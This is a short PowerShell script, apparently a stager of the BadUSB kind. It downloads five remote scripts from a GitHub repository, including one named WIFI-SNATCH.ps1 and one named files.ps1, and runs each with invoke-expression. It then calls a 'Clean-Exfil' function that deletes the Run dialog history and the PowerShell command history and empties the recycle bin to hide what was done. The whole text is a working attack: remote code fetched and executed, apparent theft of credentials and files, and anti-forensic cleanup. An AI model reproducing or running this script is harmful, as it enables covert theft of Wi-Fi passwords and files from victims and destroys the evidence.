
$task1 = iwr https://github.com/skekic16/lol/raw/main/task1.ps1?dl=1; invoke-expression $task1
$task2 = iwr https://github.com/skekic16/lol/raw/main/task2.ps1?dl=1; invoke-expression $task2
$px = iwr https://github.com/skekic16/lol/raw/main/DP.ps1?dl=1; invoke-expression $px
$pg = iwr https://github.com/skekic16/lol/raw/main/WIFI-SNATCH.ps1?dl=1; invoke-expression $pg
$pw = iwr https://github.com/skekic16/lol/raw/main/files.ps1?dl=1; invoke-expression $pw






start-sleep 10

function Clean-Exfil { 

reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

Remove-Item (Get-PSreadlineOption).HistorySavePath

Clear-RecycleBin -Force -ErrorAction SilentlyContinue

}
Clean-Exfil
